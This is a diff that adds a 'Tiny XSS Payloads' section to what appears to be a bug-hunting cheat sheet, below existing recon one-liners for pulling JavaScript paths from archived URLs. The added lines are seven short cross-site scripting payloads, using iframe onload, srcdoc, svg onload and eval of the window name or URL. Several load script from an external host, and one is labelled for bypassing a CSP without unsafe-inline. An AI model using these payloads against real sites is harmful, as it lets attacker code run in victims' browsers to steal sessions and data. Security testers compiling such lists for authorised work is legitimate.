@@ -917,6 +917,29 @@ waybackurls HOSTS | tac | sed "s#\\\/#\/hashtag#g" | egrep -o "src['\"]?
 Method 2:
 cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt
 
+Tiny XSS Payloads:
+
+ 1. If the number of frames is constant:
+<iframe/onload​=src=top[0].name+/\NJ.Rs/>
+
+ 2. If the number of frames is random:
+<iframe/onload​=src=contentWindow.name+/\NJ.Rs/>
+
+ 3. If unsafe-inline is disabled in CSP:
+<iframe/srcdoc​="<​script/src=//NJ.Rs><​/script>">
+
+ 4. Just casual script:
+<​script/src=//NJ.Rs><​/script>
+
+ 5. If you control the name of the window:
+<iframe/onload​=src=top.name>
+
+ 6. In Firefox:
+<svg/onload​=eval(name)>
+
+ 7. If you control the URL:
+<iframe/onload​=eval('’'+URL)>
+
 
 
 
